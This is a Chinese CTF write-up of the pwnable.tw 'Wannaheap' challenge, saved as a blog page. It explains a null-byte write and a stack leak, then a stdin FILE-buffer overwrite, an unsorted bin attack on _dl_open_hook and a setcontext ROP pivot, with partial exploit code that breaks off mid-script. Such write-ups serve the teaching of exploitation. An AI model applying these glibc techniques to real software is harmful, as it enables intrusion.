@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Pwnable Wannaheap - Luexp</title><meta name="Description" content="Luexp&#39;s blog"><meta property="og:title" content="Pwnable Wannaheap" />
+<meta property="og:description" content="城市是一片森林，男人是猎手，女人是陷阱。 程序分析 逻辑分析 64位的菜单程序，保护全开。开始读取一个随机值，来分配mmap的地址。随后分配一个由" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/pwnable-wannaheap/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-10T16:31:37+08:00" />
+<meta property="article:modified_time" content="2021-08-10T16:31:37+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Pwnable Wannaheap"/>
+<meta name="twitter:description" content="城市是一片森林，男人是猎手，女人是陷阱。 程序分析 逻辑分析 64位的菜单程序，保护全开。开始读取一个随机值，来分配mmap的地址。随后分配一个由"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/pwnable-wannaheap/" /><link rel="prev" href="http://example.org/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/" /><link rel="next" href="http://example.org/pwnable-printable/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Pwnable Wannaheap",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/pwnable-wannaheap\/"
+        },"genre": "posts","keywords": "pwn, pwnable.tw","wordcount":  3037 ,
+        "url": "http:\/\/example.org\/pwnable-wannaheap\/","datePublished": "2021-08-10T16:31:37+08:00","dateModified": "2021-08-10T16:31:37+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Luexp"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="GO!"> 文章 </a><a class="menu-item" href="/tags/" title="BIU!"> 标签 </a><a class="menu-item" href="/categories/" title="BOOM!"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="GO!">文章</a><a class="menu-item" href="/tags/" title="BIU!">标签</a><a class="menu-item" href="/categories/" title="BOOM!">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Pwnable Wannaheap</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Luexp</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-10">2021-08-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3037 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#程序分析">程序分析</a></li>
+    <li><a href="#利用思路">利用思路</a></li>
+    <li><a href="#代码实现">代码实现</a>
+      <ul>
+        <li><a href="#io_getc">IO_getc</a></li>
+        <li><a href="#scanf">scanf</a></li>
+      </ul>
+    </li>
+    <li><a href="#epitome">Epitome</a>
+      <ul>
+        <li><a href="#参考">参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><blockquote>
+<p>城市是一片森林，男人是猎手，女人是陷阱。</p>
+</blockquote>
+<h2 id="程序分析">程序分析</h2>
+<p><strong>逻辑分析</strong></p>
+<p>64位的菜单程序，保护全开。开始读取一个随机值，来分配mmap的地址。随后分配一个由用户定义的不大于0x313370大小的堆块，并利用沙盒，限制系统调用，使其仅能使用ORW。</p>
+<p>程序的主逻辑是创建一个双向链表，并且在双向链表前后，填充随机大小的padding，使得每个链表之间的距离是不固定的。其中表头指向的节点是由一个随机值来决定，这个随机值会破坏链表由输入的index的大小链接起来的顺序，从而在后续显示中，不一定能显示到目标节点，是一个小bug。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165422087.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165422087.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814165422087.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814165422087.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165422087.png"
+        title="image-20210814165422087" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165456059.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165456059.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814165456059.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814165456059.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165456059.png"
+        title="image-20210814165456059" /></p>
+<p><strong>漏洞分析</strong></p>
+<p>在最初由用户定义的不大于0x313370大小的堆块时，如果用户第一次输入的大小大于0x313370将会要求用户重新输入，但是最后分配得到堆块后，会用第一次输入的值来修改堆块的结尾。因此这里存在一个任意地址写\x00漏洞。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165817910.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165817910.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814165817910.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814165817910.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814165817910.png"
+        title="image-20210814165817910" /></p>
+<p>在创建堆块数据时，数据内容是用strdup来复制，而复制的内容是储存在栈上，由此存在泄露后续栈地址内容的漏洞。故可利用其来泄露初libc地址。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814170204850.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814170204850.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814170204850.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814170204850.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814170204850.png"
+        title="image-20210814170204850" /></p>
+<h2 id="利用思路">利用思路</h2>
+<blockquote>
+<p>漏洞1：任意地址写\x00</p>
+<p>漏洞2：泄露栈数据</p>
+</blockquote>
+<p>任意地址写\x00看起来是微不足道，难以利用，就像一滴水滴在树叶上，仅使其微小的颤抖了一些，想要将树叶滴穿，是痴人说梦，但如果这片树叶本身就刚好有一个细小的孔洞，恰能够容下一滴水滴，那么滴穿树叶也就成了可能。</p>
+<p>而本题程序所用的libc-2.24版本恰巧就是一片有细小孔洞的树叶，这个孔洞出现在FILE_stdin的IO_buf_end处。</p>
+<p>观察FILE_stdin结构，可以发现，IO_buf_end的地址的最低为恰巧为\x00，如果利用漏洞1修改IO_buf_base的最低为，那么我们的输入缓存就可以修改FILE_stdin即随后的值。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814171702869.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814171702869.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814171702869.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814171702869.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814171702869.png"
+        title="image-20210814171702869" /></p>
+<p>当我们分配一个很大的chunk时，将会调用mmap来分配，而分配的值会紧随libc加入内存的地址向下延伸，因此分配得到的地址和libc之间的便宜是固定的，利用这个原理，可以实现对IO_buf_base的修改。</p>
+<blockquote>
+<p>注：这里必需分配的还要大于ld间的间隙，否则不会分配到libc上，而回分配到ld中。</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814172427608.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814172427608.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814172427608.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814172427608.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814172427608.png"
+        title="image-20210814172427608" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814172448820.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814172448820.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814172448820.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814172448820.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814172448820.png"
+        title="image-20210814172448820" /></p>
+<p>利用漏洞2泄露libc后，如何执行ROP链？</p>
+<p>这里利用了dl_open_hook，当IO_FILE结构调用相应的vtable函数时，会对其进行检测，在检测函数中会判断dl_open_hook是否为空，不为空时会执行(*dlopen_mode)()，dlopen_mode是dl_open_hook结构的第一个字段，dlopen_mode是指向函数指针的指针。</p>
+<p>利用unsorted_bin攻击dl_open_hook后，将会执行main_arena+88指向的gadget，利用该gadget和setcontext最终可以实现栈迁移和执行ROP链。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">attribute_hidden</span>
+<span class="nf">_IO_vtable_check</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">_IO_vtable_check</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+
+  <span class="cm">/* In case this libc copy is in a non-default namespace, we always
+</span><span class="cm">     need to accept foreign vtables because there is always a
+</span><span class="cm">     possibility that FILE * objects are passed across the linking
+</span><span class="cm">     boundary.  */</span>
+  <span class="p">{</span>
+    <span class="n">Dl_info</span> <span class="n">di</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">_dl_open_hook</span> <span class="o">!=</span> <span class="nb">NULL</span>
+        <span class="o">||</span> <span class="p">(</span><span class="n">_dl_addr</span> <span class="p">(</span><span class="n">_IO_vtable_check</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">di</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
+            <span class="o">&amp;&amp;</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_ns</span> <span class="o">!=</span> <span class="n">LM_ID_BASE</span><span class="p">))</span>
+      <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="代码实现">代码实现</h2>
+<p><strong>修改IO_buf_base</strong></p>
+<p>利用漏洞1，将IO_buf_base最低地址修改为\x00。这里输入的字符，用于后续ORW中打开的文件名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#1.modify stdin buffer</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Size :&#34;</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x6998e8</span><span class="p">))</span> <span class="c1">#local</span>
+<span class="c1">#sl(str(0x6c28e8))</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Size :&#34;</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x300000</span><span class="p">))</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Content :&#34;</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="s2">&#34;./flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>泄露libc</strong></p>
+<p>利用漏洞2，来泄露libc，具体的代码实现前，先让我们深入了解一下IO_getc和scanf两个函数，在缓存机制上取值的行为。</p>
+<h3 id="io_getc">IO_getc</h3>
+<p>IO_getc首先会锁住IO_FILE结构，然后调用 _IO_getc_unlocked (fp)。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_getc</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
+  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">_IO_getc_unlocked</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>_IO_getc_unlocked (fp)是一个宏定义，其根据IO_read_ptr和IO_read_end之间的不同大小，执行不同的操作。</p>
+<ul>
+<li>_IO_read_ptr&gt;=_IO_read_end	执行__uflow (_fp)</li>
+<li>_IO_read_ptr&lt;_IO_read_end 	返回_IO_read_ptr指向的值，并指向下一个地址</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _IO_getc_unlocked(_fp) \
+</span><span class="cp">       (_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, 0) \
+</span><span class="cp">	? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)
+</span></code></pre></td></tr></table>
+</div>
+</div><p>uflow 调用underflow，underflow会调用file_read，最终调用read(,IO_buf_base,IO_buf_end-IO_buf_base)，这里在源码中没有找到，给出汇编代码和调用栈。</p>
+<blockquote>
+<p>注：程序沙盒对read的第三个参数count有大小限制，IO_buf_end-IO_buf_base的大小需要在改限制内。</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175847326.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175847326.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814175847326.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814175847326.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175847326.png"
+        title="image-20210814175847326" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175941285.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175941285.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814175941285.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814175941285.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175941285.png"
+        title="image-20210814175941285" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175956687.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175956687.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814175956687.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814175956687.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814175956687.png"
+        title="image-20210814175956687" /></p>
+<h3 id="scanf">scanf</h3>
+<p>scanf函数过于复杂，这里只简单讲解其从缓冲区获取数据的机制，原理和IO_getc一样，会去判断IO_read_ptr和IO_read_end之间的大小关系，但是由于格式字符串的原因，可能不能在我们的缓冲区中匹配到相应字符，因此不会对IO_read_ptr的值进行改变。</p>
+<p>利用漏洞2泄露libc是很简单的事情，但是由于沙盒对read第三个参数的限制，不能将IO_buf_end的值修改的过大。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#2.leak libc</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;key :&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x22</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;data :&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;key :&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x12</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;data :&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="s2">&#34;R&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;key:&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x12</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>攻击dl_open_hook，调用ROP链</strong></p>
+<p>泄露libc后，我们可以将IO_buf_end修改到main_arena后面，从而可以更改unsorted bin链表实时unsorted bin attack。注意，对于中间的值，最好不要修改，保留原来的值。</p>
+<p>观察调用(*dlopen_mode)()后的寄存器环境，发现RAX保留了main_arena的地址，因此考虑libc中是否存在mov rdi,rax;call [rax+xx]这样的gadget，利用call从而来调用setcontext，继而实现栈迁移。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814181202915.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814181202915.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814181202915.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814181202915.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814181202915.png"
+        title="image-20210814181202915" /></p>
+<p>利用ROPgadget查找后，选择了call [rax+0x20]的gadget，在rax+0x20处布置setcontext，随后实现栈迁移。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/nopnoping/img/raw/master/img/image-20210814181407279.png"
+        data-srcset="https://gitee.com/nopnoping/img/raw/master/img/image-20210814181407279.png, https://gitee.com/nopnoping/img/raw/master/img/image-20210814181407279.png 1.5x, https://gitee.com/nopnoping/img/raw/master/img/image-20210814181407279.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/nopnoping/img/raw/master/img/image-20210814181407279.png"
+        title="image-20210814181407279" /></p>
+<p>在IO_stdin结构的后面存在宽字符的缓冲区，可以利用该缓冲区来布置ROP链。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 3.unsortd bin attack dl_open_hook</span>
+<span class="c1"># 	local</span>
+<span class="n">gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x00000000000676aa</span>
+<span class="n">heap</span><span class="o">=</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x301000</span>
+<span class="n">ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000001fc1c</span>
+<span class="n">rdi_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000001fc6a</span>
+<span class="n">rsi_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000001fc1b</span>
+<span class="n">rdx_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000001b92</span>
